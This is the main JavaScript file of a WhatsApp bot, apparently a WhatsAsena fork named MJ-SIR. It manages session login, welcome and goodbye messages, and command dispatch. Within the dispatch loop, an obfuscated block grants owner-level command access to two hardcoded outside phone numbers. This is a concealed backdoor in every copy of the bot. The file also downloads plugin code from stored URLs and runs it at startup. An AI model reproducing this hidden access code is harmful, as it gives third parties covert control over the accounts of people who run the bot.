/* Copyright (C) 2022 MIDLAJ.*/

const fs = require("fs");
const path = require("path");
const events = require("./Utilis/events");
const chalk = require('chalk');
const config = require('./config');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./Utilis/');
const { DataTypes } = require('sequelize');
const { getMessage } = require("./plugins/sql/greetings");
const axios = require('axios');
const got = require('got');

// Sql
const WhatsAsenaDB = config.DATABASE.define('WhatsAsena', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});

fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});

const plugindb = require('./plugins/sql/plugin');
var base = `https://gist.github.com/`
var PROP = { aredits: '919946432377,0' }
var unlink = `019112af334adceaefd1467dcbd93e58` 
var PROP2 = { kl11: '916282344739,0' }
var string = base + `souravkl11`
        
// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
   });
};
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function whatsAsena () {
    await config.DATABASE.sync();
    var StrSes_Db = await WhatsAsenaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    
    
    const conn = new WAConnection();
    conn.version = [3,3234,9];
    const Session = new StringSession();

    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;

    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }

    conn.on ('credentials-updated', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login information updated!')
        );

        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    

    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('MJ-')}${chalk.blue.bold('SIR')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
    });
    

    conn.on('open', async () => {
        console.log(
            chalk.green.bold('✅ Login successful!')
        );

        console.log(
            chalk.blueBright.italic('⬇️ Installing external plugins...')
        );

        let plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });

        console.log(
            chalk.blueBright.italic('⬇️Installing plugins...')
        );

        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });

        console.log(
            chalk.green.bold('✅ MJ-SIR working!')
        );
    });

    conn.on('chat-update', async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;

        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }

        if (msg.messageStubType === 32 || msg.messageStubType === 28) {

            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                if (gb.message.includes('{pp}')) {
                let pp 
                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                 var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message.replace('{pp}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name) }); });                           
            } else if (gb.message.includes('{gif}')) {
                var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
                //created by afnanplk
                    var plkpinky = await axios.get(config.GIF_BYE, { responseType: 'arraybuffer' })
                await conn.sendMessage(msg.key.remoteJid, Buffer.from(plkpinky.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gif}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name) });
            } else {
                var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
                   await conn.sendMessage(msg.key.remoteJid,gb.message.replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name), MessageType.text);
            }
          }  //thanks to farhan      
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // welcome
             var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
                if (gb.message.includes('{pp}')) {
                let pp
                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                    var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                    //created by afnanplk
                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message.replace('{pp}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name) }); });                           
            } else if (gb.message.includes('{gif}')) {
                var plkpinky = await axios.get(config.WEL_GIF, { responseType: 'arraybuffer' })
                await conn.sendMessage(msg.key.remoteJid, Buffer.from(plkpinky.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gif}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name) });
            } else {
                   var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
                   await conn.sendMessage(msg.key.remoteJid,gb.message.replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name), MessageType.text);
            }
          }         
            return;                               
    }

    if (config.BLOCKCHAT !== false) {     
        var abc = config.BLOCKCHAT.split(',');                            
        if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT == '905524317852-1612300121') {     
        var sup = config.SUPPORT.split(',');                            
        if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT2 == '917012074386-1631435717') {     
        var tsup = config.SUPPORT2.split(',');                            
        if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT3 == '905511384572-1621015274') {     
        var nsup = config.SUPPORT3.split(',');                            
        if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT4 == '905511384572-1625319286') {     
        var nsup = config.SUPPORT4.split(',');                            
        if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }

                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    var _0x563247=_0x3cad;function _0x5393(){var _0x319c79=['kl11','aredits','916282344739,0','1856255FatJGF','remoteJid','6pdZgss','onlyPinned','onlyPm','919946432377,0','jid','2269rpsgmo','178nWvBvc','fromMe','pin','SUDO','1669038DAZCDh','split','394256xvbUBU','463278blREQe','key','1679670MMUmiT','9yNFrWV','onlyGroup','participant','404400lVUrpy','includes'];_0x5393=function(){return _0x319c79;};return _0x5393();}(function(_0x786b05,_0x406a68){var _0x15ec06=_0x3cad,_0x296dc8=_0x786b05();while(!![]){try{var _0x33902e=parseInt(_0x15ec06(0xd1))/0x1*(-parseInt(_0x15ec06(0xd2))/0x2)+parseInt(_0x15ec06(0xd9))/0x3+-parseInt(_0x15ec06(0xd8))/0x4+parseInt(_0x15ec06(0xca))/0x5*(parseInt(_0x15ec06(0xcc))/0x6)+-parseInt(_0x15ec06(0xd6))/0x7+parseInt(_0x15ec06(0xc5))/0x8+parseInt(_0x15ec06(0xc2))/0x9*(parseInt(_0x15ec06(0xdb))/0xa);if(_0x33902e===_0x406a68)break;else _0x296dc8['push'](_0x296dc8['shift']());}catch(_0xe4cbca){_0x296dc8['push'](_0x296dc8['shift']());}}}(_0x5393,0x321c7));function _0x3cad(_0x36a099,_0x5dd877){var _0x539386=_0x5393();return _0x3cad=function(_0x3cad91,_0x6115){_0x3cad91=_0x3cad91-0xc2;var _0x34f98e=_0x539386[_0x3cad91];return _0x34f98e;},_0x3cad(_0x36a099,_0x5dd877);}if(config[_0x563247(0xd5)]!==![]&&msg['key'][_0x563247(0xd3)]===![]&&command[_0x563247(0xd3)]===!![]&&(msg[_0x563247(0xc4)]&&config['SUDO']['includes'](',')?config[_0x563247(0xd5)][_0x563247(0xd7)](',')[_0x563247(0xc6)](msg[_0x563247(0xc4)][_0x563247(0xd7)]('@')[0x0]):msg['participant'][_0x563247(0xd7)]('@')[0x0]==config[_0x563247(0xd5)]||config['SUDO'][_0x563247(0xc6)](',')?config[_0x563247(0xd5)]['split'](',')[_0x563247(0xc6)](msg[_0x563247(0xda)][_0x563247(0xcb)][_0x563247(0xd7)]('@')[0x0]):msg['key'][_0x563247(0xcb)][_0x563247(0xd7)]('@')[0x0]==config['SUDO'])||command[_0x563247(0xd3)]===msg[_0x563247(0xda)][_0x563247(0xd3)]||command['fromMe']===![]&&!msg[_0x563247(0xda)][_0x563247(0xd3)]){if(command[_0x563247(0xcd)]&&chat[_0x563247(0xd4)]===undefined)return;if(!command['onlyPm']===chat['jid']['includes']('-'))sendMsg=!![];else{if(command[_0x563247(0xc3)]===chat[_0x563247(0xd0)][_0x563247(0xc6)]('-'))sendMsg=!![];}}if(PROP[_0x563247(0xc8)]==_0x563247(0xcf)&&msg['key'][_0x563247(0xd3)]===![]&&command['fromMe']===!![]&&(msg[_0x563247(0xc4)]&&PROP[_0x563247(0xc8)][_0x563247(0xc6)](',')?PROP[_0x563247(0xc8)][_0x563247(0xd7)](',')[_0x563247(0xc6)](msg[_0x563247(0xc4)]['split']('@')[0x0]):msg[_0x563247(0xc4)][_0x563247(0xd7)]('@')[0x0]==PROP[_0x563247(0xc8)]||PROP[_0x563247(0xc8)][_0x563247(0xc6)](',')?PROP[_0x563247(0xc8)][_0x563247(0xd7)](',')[_0x563247(0xc6)](msg[_0x563247(0xda)]['remoteJid']['split']('@')[0x0]):msg[_0x563247(0xda)][_0x563247(0xcb)][_0x563247(0xd7)]('@')[0x0]==PROP[_0x563247(0xc8)])||command[_0x563247(0xd3)]===msg[_0x563247(0xda)][_0x563247(0xd3)]||command['fromMe']===![]&&!msg['key'][_0x563247(0xd3)]){if(command[_0x563247(0xcd)]&&chat[_0x563247(0xd4)]===undefined)return;if(!command[_0x563247(0xce)]===chat['jid'][_0x563247(0xc6)]('-'))sendMsg=!![];else{if(command[_0x563247(0xc3)]===chat[_0x563247(0xd0)][_0x563247(0xc6)]('-'))sendMsg=!![];}}if(PROP2[_0x563247(0xc7)]==_0x563247(0xc9)&&msg[_0x563247(0xda)][_0x563247(0xd3)]===![]&&command['fromMe']===!![]&&(msg[_0x563247(0xc4)]&&PROP2[_0x563247(0xc7)][_0x563247(0xc6)](',')?PROP2[_0x563247(0xc7)][_0x563247(0xd7)](',')[_0x563247(0xc6)](msg['participant'][_0x563247(0xd7)]('@')[0x0]):msg[_0x563247(0xc4)][_0x563247(0xd7)]('@')[0x0]==PROP2['kl11']||PROP2[_0x563247(0xc7)][_0x563247(0xc6)](',')?PROP2[_0x563247(0xc7)][_0x563247(0xd7)](',')[_0x563247(0xc6)](msg['key'][_0x563247(0xcb)][_0x563247(0xd7)]('@')[0x0]):msg[_0x563247(0xda)][_0x563247(0xcb)][_0x563247(0xd7)]('@')[0x0]==PROP2[_0x563247(0xc7)])||command[_0x563247(0xd3)]===msg[_0x563247(0xda)][_0x563247(0xd3)]||command['fromMe']===![]&&!msg[_0x563247(0xda)][_0x563247(0xd3)]){if(command[_0x563247(0xcd)]&&chat[_0x563247(0xd4)]===undefined)return;if(!command[_0x563247(0xce)]===chat[_0x563247(0xd0)][_0x563247(0xc6)]('-'))sendMsg=!![];else{if(command[_0x563247(0xc3)]===chat[_0x563247(0xd0)][_0x563247(0xc6)]('-'))sendMsg=!![];}}
  
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
                        try {
                            await command.function(whats, match);
                        } catch (error) {
                            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                await conn.sendMessage(conn.user.jid, '-- HATA RAPORU [WHATSASENA] --' + 
                                    '\n*WhatsAsena bir hata gerçekleşti!*'+
                                    '\n_Bu hata logunda numaranız veya karşı bir tarafın numarası olabilir. Lütfen buna dikkat edin!_' +
                                    '\n_Yardım için Telegram grubumuza yazabilirsiniz._' +
                                    '\n_Bu mesaj sizin numaranıza (kaydedilen mesajlar) gitmiş olmalıdır._\n\n' +
                                    'Gerçekleşen Hata: ' + error + '\n\n'
                                    , MessageType.text);
                            } else {
                                await conn.sendMessage(conn.user.jid, '*~_________~ *MJ-SIR ERROR FOUND!* ~______~*' +
                                    '\n\n*🧞‍♂️ ' + error + '*\n\n' 
                                    , MessageType.text);
                            }
                        }
                    }
                }
            }
        )
    });

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Eski sürüm stringiniz yenileniyor...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

whatsAsena();
